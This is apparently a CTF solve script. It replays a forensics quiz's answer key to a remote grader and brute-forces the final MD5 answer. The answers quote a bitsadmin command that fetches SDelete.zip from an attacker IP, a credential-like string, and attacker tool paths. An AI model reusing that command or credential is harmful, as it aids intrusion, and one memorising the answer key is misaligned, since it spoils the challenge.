#!/usr/bin/env python3
import sys
import time
from pwn import *

context.log_level = "error"

host = "gzcli.ctf.cyberjawara.id"
port = 62051

answers = [
    "https://cybersharing.net/api/download/file/8bd5ce87-b1d2-45a8-be68-03bc664ab068/7f203a93-4619-40f8-93c4-e075eb4d39dd/ea62a809-a93b-4a89-bfe1-33247f5058f8/AnsiArtInstaller.exe_AnsiArtInstaller.exe_12/21/2025 11:14:31 PM",
    "12/21/2025 11:15:10 PM",
    "ansi_art.exe,program.banner",
    "C:\\Users\\Administrator\\AppData\\Local\\Temp",
    "C:\\Users\\Administrator\\Desktop\\AnsiArt.lnk",
    "192.168.100.157:443",
    "http://192.168.100.157:8082",
    "C:\\h1dd3n",
    '"C:\\Windows\\system32\\bitsadmin.exe" /Transfer jarangoyang /priority foreground http://192.168.100.157:8082/SDelete.zip C:\\h1dd3n\\sadewa.zip',
    "ipconfig",
    "as3ng_AsengCupu123!",
    "administrators,Remote Desktop Users",
    "12/22/2025 12:02 AM",
    "C:\\h1dd3n\\mimiperi.exe",
    "C:\\h1dd3n\\sassy.exe",
    "\\85985985-ddfa-430b-bf04-fc33fcfdc881\\pipe\\epmapper",
    "C:\\h1dd3n\\kucing.exe",
]

# Read all candidates
with open('md5_candidates.txt', 'r') as f:
    all_candidates = [line.strip() for line in f if line.strip()]

# Remove tested priority ones
with open('md5_priority.txt', 'r') as f:
    priority = set(line.strip().split()[0] for line in f if line.strip() and not line.startswith('#'))

candidates = [c for c in all_candidates if c not in priority]

print(f"Starting test of {len(candidates)} candidates (skipping {len(priority)} already tested)...")
print(f"Started at: {time.strftime('%Y-%m-%d %H:%M:%S')}")

start_time = time.time()

for i, cand in enumerate(candidates):
    elapsed = time.time() - start_time
    rate = (i+1) / elapsed if elapsed > 0 else 0
    eta = (len(candidates) - i - 1) / rate if rate > 0 else 0
    
    print(f"[{i+1}/{len(candidates)}] ({rate:.1f}/s, ETA: {int(eta//60)}m{int(eta%60)}s) {cand}...", end=' ', flush=True)
    
    try:
        r = remote(host, port)
        for ans in answers:
            r.recvuntil(b"Answer: ", timeout=5)
            r.sendline(ans.encode())
        
        r.recvuntil(b"Answer: ", timeout=5)
        r.sendline(cand.encode())
        response = r.recvline(timeout=5).decode().strip()
        print(response)
        
        if "Correct!" in response:
            print(f"\n{'='*60}")
            print(f"✓✓✓ FOUND IT: {cand} ✓✓✓")
            print(f"{'='*60}\n")
            
            # Update solve.py
            import re
            with open("solve.py", "r") as f:
                content = f.read()
            content = re.sub(r'(# Question 18\s+)"[^"]*"', f'\\1"{cand}"', content)
            with open("solve.py", "w") as f:
                f.write(content)
            print("solve.py updated!")
            
            # Save to file
            with open("Q18_ANSWER.txt", "w") as f:
                f.write(cand)
            
            sys.exit(0)
        
        r.close()
    except Exception as e:
        print(f"Error: {e}")
        try:
            r.close()
        except:
            pass

print(f"\nCompleted at: {time.strftime('%Y-%m-%d %H:%M:%S')}")
print(f"Total time: {int((time.time()-start_time)//60)}m{int((time.time()-start_time)%60)}s")
print("No correct answer found.")

